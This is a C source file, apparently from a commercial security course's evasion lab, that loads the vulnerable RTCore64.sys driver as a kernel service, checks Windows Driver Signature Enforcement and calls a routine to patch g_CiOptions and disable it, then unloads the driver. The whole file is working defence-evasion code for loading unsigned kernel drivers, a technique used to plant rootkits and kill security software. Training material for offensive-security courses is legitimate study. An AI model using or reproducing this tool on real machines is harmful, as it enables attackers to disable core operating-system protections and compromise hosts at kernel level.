/*
 * -----------------------------------------------------------
 * This code is part of the Evasion Lab for the
 * Certified Evasion Techniques Professional (CETP) course
 * by Altered Security.
 *
 * Copyright (c) 2025 Altered Security. All rights reserved.
 *
 * This code is provided solely for educational purposes.
 * Unauthorized use, duplication, or distribution of this
 * code is strictly prohibited without explicit permission
 * from Altered Security.
 * -----------------------------------------------------------
 */

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>


#include "ntoskrnlOffsets.h"

#pragma comment(lib, "ntdll.lib")



 // Function to check if Driver Signature Enforcement (DSE) is enabled
BOOL checkDSE()
{
    // Initialize the SYSTEM_CODEINTEGRITY_INFORMATION structure with its size
    SYSTEM_CODEINTEGRITY_INFORMATION CiInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
	
    // Query the system's code integrity settings using NtQuerySystemInformation
    const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
		&CiInfo,
		sizeof(CiInfo),
		NULL);
	if (!NT_SUCCESS(Status))
		printf("[-] Failed to query code integrity status: %08X\n", Status);

    // Return TRUE if DSE is enabled and test-signing mode is NOT enabled
	return (CiInfo.CodeIntegrityOptions &
		(CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED;
}


// Function to load a driver by creating and starting a service
BOOL LoadDriver(const wchar_t* driverName, const wchar_t* driverPath) {
    
    // Open a handle to the Service Control Manager (SCM) with permission to create services
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scmHandle == NULL) {
        printf("[-] Failed to open Service Control Manager.\n");
        return FALSE;
    }

    // Create the service for the driver
    SC_HANDLE serviceHandle = CreateService(
        scmHandle,
        driverName,             // Service name
        driverName,             // Display name
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,   // Service type
        SERVICE_DEMAND_START,    // Start type
        SERVICE_ERROR_IGNORE,
        driverPath,             // Path to driver file
        NULL, NULL, NULL, NULL, NULL
    );

    // Handle case where service already exists
    if (serviceHandle == NULL) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            printf("[!] Service already exists, attempting to start.\n");
            serviceHandle = OpenService(scmHandle, driverName, SERVICE_START);
        }
        else {
            printf("[-] Failed to create service.\n");
            CloseServiceHandle(scmHandle);
            return FALSE;
        }
    }

    // Start the driver service
    if (StartService(serviceHandle, 0, NULL)) {
        printf("[+] Driver loaded successfully!\n");
    }
    else {
        printf("[-] Failed to start service.\n");
        return FALSE;
    }

    // Close handles to the service and SCM
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);

    return TRUE;
}


// Function to unload a driver by stopping and deleting its service
BOOL UnloadDriver(const wchar_t* driverName) {
    
    // Open a handle to the Service Control Manager (SCM) with full access
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scmHandle == NULL) {
        printf("[-] Failed to open Service Control Manager.\n");
        return FALSE;
    }

    // Open a handle to the existing service with permissions to stop and delete it
    SC_HANDLE serviceHandle = OpenService(scmHandle, driverName, SERVICE_STOP | DELETE);
    if (serviceHandle == NULL) {
        printf("[-] Failed to open service.\n");
        CloseServiceHandle(scmHandle);
        return FALSE;
    }

    // Stop the service
    SERVICE_STATUS status;
    if (ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
        printf("[+] Driver stopped successfully.\n");
    }
    else {
        printf("[-] Failed to stop service.\n");
        return FALSE;
    }





    // Delete the service
    if (DeleteService(serviceHandle)) {
        printf("[+] Service deleted successfully.\n");
    }
    else {
        printf("[-] Failed to delete service.\n");
        return FALSE;
    }

    // Close handles to the service and SCM
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);

    return TRUE;
}


int main(int argc, char** argv) {
	

    if (argc < 2) {
        printf("\n[!] Usage:\n\t%s <Service_Name>\n\n", argv[0]);
        return -1;
    }

    // Load CI.dll symbols
	BOOL downloadStatus = LoadNtoskrnlOffsetsFromInternet(TRUE);
	if (!downloadStatus){ 
		printf("[-] Failed to load CI symbols\n");
		return -1;
	}

	printf("\n\n");
    // print the CI.dll kernel offsets
	PrintNtoskrnlOffsets();


    const wchar_t* rtcorePath = L"C:\\Users\\Public\\RTCore64.sys";

    // Convert the driver name to wchar_t*
    int len = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, NULL, 0);
    wchar_t* driverName = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, driverName, len);

    // Loading rtcore Driver
    printf("[+] Trying to Load %ws ...\n", rtcorePath);
    if (!LoadDriver(driverName, rtcorePath)) {
        printf("[-] Failed to Load/Start Driver\n");
    }
    else {
        printf("[+] Driver Loaded/Started Successfully\n");
    }

    // Check if DSE is enabled or disabled
	BOOL isDSE = checkDSE();
	if (isDSE)
	{
		printf("\n\n");
		printf("[*] DSE is Enabled\n");
	}
	else {
		printf("\n\n");
		printf("[*] DSE is Disabled!\n");
	}
    // Patch g_CiOptions to disable DSE and load the unsigned driver
	disableDSE();

    // Unload the RTCore64 driver
    printf("[+] Trying to unLoad %ws ...\n", rtcorePath);
    if (!UnloadDriver(driverName)) {
        printf("[-] Failed to UnLoad Driver\n");
    }
    else {
        printf("[+] Driver UnLoaded Successfully\n");
    }


	printf("\n\n");
	return 0;
}